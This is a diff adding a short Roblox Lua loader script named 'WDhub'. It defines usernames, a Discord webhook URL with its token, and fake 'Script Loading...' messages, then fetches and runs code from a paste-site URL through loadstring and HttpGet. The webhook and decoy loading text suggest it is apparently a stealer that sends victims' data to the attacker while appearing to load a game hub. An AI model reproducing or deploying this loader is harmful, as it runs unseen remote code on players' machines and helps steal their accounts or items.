@@ -1,0 +1,9 @@
+UserName = "ZoroLost1001"
+UserName2 = "ZoroLost1001"
+Webhook = "https://discord.com/api/webhooks/1112271527904284682/_Zoyqjm7CRSl1qmuQIC3R6CCtOcC3jbifNIcwO5ZXN_5c_zMk_WrF4rQCqj4ykK0_48z"
+_G.ScriptName = "WDhub"
+_G.FirstText = "Please wait.."
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 100
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984466", true))()
